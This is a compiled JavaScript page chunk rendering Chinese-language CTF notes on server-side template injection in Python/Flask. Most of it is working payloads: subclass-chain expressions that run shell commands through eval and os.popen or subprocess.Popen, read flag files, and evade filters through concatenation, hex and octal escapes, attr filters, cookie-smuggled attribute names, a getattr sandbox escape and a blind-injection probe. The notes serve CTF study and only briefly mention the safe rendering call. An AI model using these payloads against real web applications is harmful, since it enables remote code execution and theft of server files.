(window.webpackJsonp=window.webpackJsonp||[]).push([[33],{786:function(s,e,a){"use strict";a.r(e);var _=a(103),t=Object(_.a)({},(function(){var s=this,e=s.$createElement,a=s._self._c||e;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"ssti"}},[s._v("SSTI "),a("a",{staticClass:"header-anchor",attrs:{href:"#ssti"}},[s._v("#")])]),s._v(" "),a("p",[s._v("SSTI为模板注入，以下皆为 Python3 环境")]),s._v(" "),a("p",[s._v("首先由于模板解析的特性，当使用 render_template_string 则可以通过各个类之间的调用造成命令执行")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('render_template_string("{{1+1}}")\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("这一解析方法时就会把输入的内容直接放入页面解析，通常的检测方法为")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{{1+1}}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("返回的是 2，这也说明其中的内容被执行。")]),s._v(" "),a("p",[s._v("而安全的方法是")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('render_template("{{1+1}}")\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("返回的是")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{{1+1}}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"利用方法"}},[s._v("利用方法 "),a("a",{staticClass:"header-anchor",attrs:{href:"#利用方法"}},[s._v("#")])]),s._v(" "),a("p",[s._v("通常是通过某一对象向上寻找基类，进而使用包含某些特殊方法的类，并调用其中的危险函数来执行命令")]),s._v(" "),a("p",[s._v("以下为 flask 的常见可用类")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("75 <class '_frozen_importlib._ModuleLock'>\n76 <class '_frozen_importlib._DummyModuleLock'>\n77 <class '_frozen_importlib._ModuleLockManager'>\n78 <class '_frozen_importlib._installed_safely'>\n79 <class '_frozen_importlib.ModuleSpec'>\n91 <class '_frozen_importlib_external.FileLoader'>\n92 <class '_frozen_importlib_external._NamespacePath'>\n93 <class '_frozen_importlib_external._NamespaceLoader'>\n95 <class '_frozen_importlib_external.FileFinder'>\n103 <class 'codecs.IncrementalEncoder'>\n104 <class 'codecs.IncrementalDecoder'>\n105 <class 'codecs.StreamReaderWriter'>\n106 <class 'codecs.StreamRecoder'>\n128 <class 'os._wrap_close'>\n129 <class '_sitebuiltins.Quitter'>\n130 <class '_sitebuiltins._Printer'>\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br")])]),a("p",[s._v("当确定存在模板注入后就是先寻找可用类")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{{''.__class__.__mro__[1].__subclasses__()}}\n\n__class__ 返回调用的参数类型\n__mro__ 此属性是在方法解析期间寻找基类时考虑的类元组\n__subclasses__() 返回object的子类\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("class 返回 str 类，str的基类是 object类，之后返回object的子类，就可以实现多种方法")]),s._v(" "),a("p",[s._v("例如命令执行：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{{''.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"ls\").read()')}}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("文件读取：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/this_is_the_flag.txt').read()}}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"waf绕过"}},[s._v("WAF绕过 "),a("a",{staticClass:"header-anchor",attrs:{href:"#waf绕过"}},[s._v("#")])]),s._v(" "),a("p",[s._v("很多 Python 中的语法在 SSTI 中也都是可以用的")]),s._v(" "),a("p",[s._v("attr 用于获取变量，以下写法是相同的")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('""|attr("__class__")\n"".__class__\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("获取数组参数可以使用")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('__gititem__()\n__gititem__(数组下标)\n__gititem__("key")\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("绕过双引号可以使用")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("request.cookies.参数名\nrequest.args.参数名\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("比如通过 + 进行拼接绕过关键字，也可以使用 “” 进行拼接，或者 "),a("code",[s._v('"str1".__add__("str2")')]),s._v(" 的方式")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{{''.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__['__buil'+'tins__']['ev'+'al']('__imp'+'ort__(\"o'+'s\").pop'+'en(\"ls\").read()')}}\n{{[].__class__.__base__.__subclasses__()[75].__init__.__globals__.__builtins__[\"open\"](\"/fl\"\"ag\").read()}}\n{{app.__init__.__globals__[\"__buil\".__add__(\"tins__\")].open(\"/fla\".__add__(\"g\")).read()}}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("通过十六进制绕过 . 和 _")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('{{\'\'["\\x5f\\x5fclass\\x5f\\x5f"]["\\x5f\\x5fmro\\x5f\\x5f"][1]["\\x5f\\x5fsubclasses\\x5f\\x5f"]()[342]["\\x5f\\x5finit\\x5f\\x5f"]["\\x5f\\x5fglobals\\x5f\\x5f"]["\\x5f\\x5fbuiltins\\x5f\\x5f"]["\\x5f\\x5fimport\\x5f\\x5f"](\'os\')["popen"]("ls")["read"]()}}\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("或者在无回显的时候进行盲注 "),a("code",[s._v("177 threading.Semaphore")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{% if ''.__class__.__mro__[-1].__subclasses__()[177].__init__.__globals__['__bui'+'ltins__']['open']('/app/flag').read()[0:1]=='f' %}xxx{% endif %}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("也有特殊的可用类 "),a("code",[s._v("<class 'subprocess.Popen'>")]),s._v(" 直接执行命令")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("{{''.__class__.__mro__[-1].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("或者利用 getattr 进行沙箱逃逸")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("getattr(getattr(getattr(getattr(getattr(getattr(getattr([],'__cla'+'ss__'),'__mr'+'o__')[1],'__subclas'+'ses__')()[104],'__init__'),'__glob'+'al'+'s__')['sy'+'s'],'mod'+'ules')['o'+'s'],'sy'+'ste'+'m')('l'+'s')\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("和利用八进制绕过")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('{%print%0a(lipsum|attr("\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137"))|attr("\\137\\137\\147\\145\\164\\151\\164\\145\\155\\137\\137")("\\137\\137\\142\\165\\151\\154\\164\\151\\156\\163\\137\\137")|attr("\\137\\137\\147\\145\\164\\151\\164\\145\\155\\137\\137")("\\145\\166\\141\\154")("\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137\\50\\47\\157\\163\\47\\51\\56\\160\\157\\160\\145\\156\\50\\47\\143\\141\\164\\40\\57\\146\\154\\141\\147\\47\\51\\56\\162\\145\\141\\144\\50\\51")%}\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("利用 attr 和 request 绕过")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('{{()|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3)()|attr(request.cookies.x4)(78)|attr(request.cookies.x5)|attr(request.cookies.x6)|attr(request.cookies.x4)(request.cookies.x7)|attr(request.cookies.x4)(request.cookies.x9)(request.cookies.x10)}}\nCookie: x1=__class__; x2=__base__; x3=__subclasses__; x4=__getitem__; x5=__init__; x6=__globals__; x7=__builtins__; x8=__getitem__; x9=eval; x10=__import__("os").popen("cat flag.txt").read();\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("h2",{attrs:{id:"其他方法"}},[s._v("其他方法 "),a("a",{staticClass:"header-anchor",attrs:{href:"#其他方法"}},[s._v("#")])]),s._v(" "),a("p",[s._v("查看对象属性")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("(对象名).func_globals  \n(对象名).__code__.co_consts \n(对象名).__code__.co_names\n(对象名).__dict__\n(对象名).__globals__\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("h2",{attrs:{id:"相关题目"}},[s._v("相关题目 "),a("a",{staticClass:"header-anchor",attrs:{href:"#相关题目"}},[s._v("#")])]),s._v(" "),a("p",[s._v("BUUCTF\t\t[BJDCTF 2nd]fake google")])])}),[],!1,null,null,null);e.default=t.exports}}]);